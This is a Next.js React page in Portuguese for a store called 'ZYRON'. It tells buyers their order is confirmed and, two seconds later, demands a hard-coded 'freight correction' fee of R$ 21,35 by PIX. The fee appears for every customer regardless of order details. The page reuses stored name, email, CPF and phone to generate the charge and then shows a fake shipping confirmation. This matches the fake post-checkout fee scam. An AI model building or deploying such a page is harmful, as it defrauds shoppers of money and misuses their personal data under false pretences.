'use client'

import { useEffect, useState, useRef, useCallback } from 'react'
import { useRouter } from 'next/navigation'

function getQrUrl(text: string) {
  return `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(text)}`
}

type Stage = 'confirmed' | 'upsell' | 'pix' | 'done'

export default function FretePage() {
  const router = useRouter()
  const [stage, setStage] = useState<Stage>('confirmed')
  const [pixCode, setPixCode] = useState('')
  const [txid, setTxid] = useState('')
  const [loading, setLoading] = useState(false)
  const [copied, setCopied] = useState(false)
  const [error, setError] = useState('')
  const [statusMsg, setStatusMsg] = useState('Aguardando pagamento...')
  const [paid, setPaid] = useState(false)
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // Show upsell after 2s on confirmed stage
  useEffect(() => {
    if (stage !== 'confirmed') return
    const t = setTimeout(() => setStage('upsell'), 2000)
    return () => clearTimeout(t)
  }, [stage])

  const stopPolling = useCallback(() => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current)
      pollingRef.current = null
    }
  }, [])

  const pollStatus = useCallback((id: string) => {
    stopPolling()
    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/status/${id}`)
        const data = await res.json()
        if (data.status === 'approved' || data.status === 'paid') {
          stopPolling()
          setPaid(true)
          setStage('done')
          setTimeout(() => router.push('/obrigado'), 1500)
        }
      } catch {
        // silently retry
      }
    }, 2000)
  }, [stopPolling])

  useEffect(() => {
    return () => stopPolling()
  }, [stopPolling])

  async function handlePayFrete() {
    setLoading(true)
    setError('')
    try {
      // Reutiliza dados do cliente salvos pelo checkout original
      const customerBody = {
        name: sessionStorage.getItem('ck_name') || '',
        email: sessionStorage.getItem('ck_email') || '',
        cpf: sessionStorage.getItem('ck_cpf') || '',
        phone: sessionStorage.getItem('ck_phone') || '',
      }
      const res = await fetch('/api/checkout-frete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(customerBody),
      })
      const data = await res.json()
      if (!res.ok || data.error) {
        setError(data.error || 'Erro ao gerar PIX. Tente novamente.')
        setLoading(false)
        return
      }
      const code = data.qr_code || ''
      setPixCode(code)
      setTxid(String(data.transaction_id))
      setStage('pix')
      pollStatus(String(data.transaction_id))
    } catch {
      setError('Erro de conexão. Verifique sua internet e tente novamente.')
    } finally {
      setLoading(false)
    }
  }

  async function handleCopy() {
    try {
      await navigator.clipboard.writeText(pixCode)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    } catch {
      setCopied(false)
    }
  }

  return (
    <div className="wrap">
      {/* topbar */}
      <div className="topbar">
        <span className="heart">♡</span> Diversidade e Qualidade em um clique
      </div>

      {/* header */}
      <header className="zy-header">
        <div style={{ width: 28 }} />
        <div className="logo">ZYRON</div>
        <div style={{ width: 28 }} />
      </header>

      {/* STAGE: confirmado */}
      {(stage === 'confirmed' || stage === 'upsell') && (
        <div className="pix-card" style={{ marginTop: 24 }}>
          {/* Confirmação */}
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10, paddingBottom: 20, borderBottom: '1px solid #e5e7eb', marginBottom: 20 }}>
            <div style={{ width: 64, height: 64, borderRadius: '50%', background: '#dcfce7', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M20 6L9 17l-5-5" />
              </svg>
            </div>
            <h2 style={{ fontSize: 20, fontWeight: 800, color: '#16a34a', margin: 0 }}>Pedido confirmado!</h2>
            <p style={{ color: '#374151', fontSize: 14, textAlign: 'center', lineHeight: 1.6, margin: 0 }}>
              Seu pagamento foi recebido com sucesso.
            </p>
          </div>

          {/* Upsell: correção de frete */}
          {stage === 'upsell' && (
            <div>
              {/* Alerta frete */}
              <div style={{ background: '#fff7ed', border: '1.5px solid #fed7aa', borderRadius: 10, padding: '14px 16px', marginBottom: 18, display: 'flex', gap: 10, alignItems: 'flex-start' }}>
                <div style={{ width: 28, height: 28, borderRadius: '50%', background: '#ffedd5', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ea580c" strokeWidth="2.2"><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" /></svg>
                </div>
                <div>
                  <p style={{ fontWeight: 700, color: '#9a3412', fontSize: 14, margin: '0 0 4px' }}>Atenção: correção de frete necessária</p>
                  <p style={{ color: '#7c2d12', fontSize: 13, margin: 0, lineHeight: 1.5 }}>
                    Identificamos a necessidade de uma correção no frete para liberar a emissão do envio.
                  </p>
                </div>
              </div>

              {/* Card valor */}
              <div style={{ border: '1.5px solid #e5e7eb', borderRadius: 10, padding: '16px', marginBottom: 18, textAlign: 'center' }}>
                <p style={{ color: '#6b7280', fontSize: 12, fontWeight: 700, letterSpacing: '0.1em', margin: '0 0 6px' }}>VALOR DA CORREÇÃO</p>
                <p style={{ fontSize: 32, fontWeight: 800, color: '#111', margin: '0 0 4px' }}>R$ 21,35</p>
                <p style={{ color: '#6b7280', fontSize: 12, margin: 0 }}>Pagamento único via PIX</p>
              </div>

              {/* Info steps */}
              <div className="steps" style={{ marginBottom: 18 }}>
                <b>O que acontece agora:</b>
                1. Pague a correção de frete via PIX<br />
                2. Seu pedido é liberado para envio imediato<br />
                3. Você recebe o código de rastreamento por e-mail
              </div>

              {error && <div className="pix-err" style={{ marginBottom: 14 }}>{error}</div>}

              <button className="btn" onClick={handlePayFrete} disabled={loading}>
                {loading ? 'Gerando PIX...' : 'Pagar correção de frete — R$ 21,35'}
              </button>
            </div>
          )}
        </div>
      )}

      {/* STAGE: pix */}
      {stage === 'pix' && (
        <div className="pix-card" style={{ marginTop: 24 }}>
          <h2>PIX — Correção de Frete</h2>
          <p className="sub">Escaneie o QR Code ou copie o código PIX abaixo</p>

          {pixCode && (
            <div className="qr-wrap">
              <img src={getQrUrl(pixCode)} alt="QR Code PIX" width={240} height={240} />
            </div>
          )}

          <div className="pix-amount">
            R$ 21,35
            <small>PAGAMENTO SEGURO VIA PIX</small>
          </div>

          <div className="copy-box">{pixCode}</div>

          <button
            className={`copy-btn${copied ? ' ok' : ''}`}
            onClick={handleCopy}
            disabled={!pixCode}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2"><rect x="9" y="9" width="13" height="13" rx="2" /><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" /></svg>
            {copied ? 'Copiado!' : 'Copiar código PIX'}
          </button>

          <div className={`status${paid ? ' paid' : ''}`}>
            <span className="dot" />
            {paid ? 'Pagamento confirmado!' : statusMsg}
          </div>

          <div className="steps" style={{ marginTop: 14 }}>
            <b>Como pagar:</b>
            1. Abra o app do seu banco<br />
            2. Escolha a opção PIX &gt; QR Code ou Copia e Cola<br />
            3. Cole o código acima e confirme o valor R$ 21,35<br />
            4. Aguarde a confirmação automática nesta tela
          </div>

          {error && <div className="pix-err" style={{ marginTop: 12 }}>{error}</div>}
        </div>
      )}

      {/* STAGE: done */}
      {stage === 'done' && (
        <div className="pix-card" style={{ marginTop: 24 }}>
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 12 }}>
            <div style={{ width: 72, height: 72, borderRadius: '50%', background: '#dcfce7', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M20 6L9 17l-5-5" />
              </svg>
            </div>
            <h2 style={{ fontSize: 20, fontWeight: 800, color: '#16a34a', margin: 0 }}>Frete confirmado com sucesso!</h2>
            <p style={{ color: '#374151', fontSize: 14, textAlign: 'center', lineHeight: 1.6, margin: 0 }}>
              Seu pedido seguirá para envio. Em breve você receberá o código de rastreamento por e-mail.
            </p>
          </div>

          <div className="steps" style={{ marginTop: 24 }}>
            <b>Resumo do pedido:</b>
            Pagamento principal: confirmado<br />
            Correção de frete: confirmada<br />
            Status: em preparacao para envio
          </div>
        </div>
      )}

      <div style={{ height: 40 }} />
    </div>
  )
}
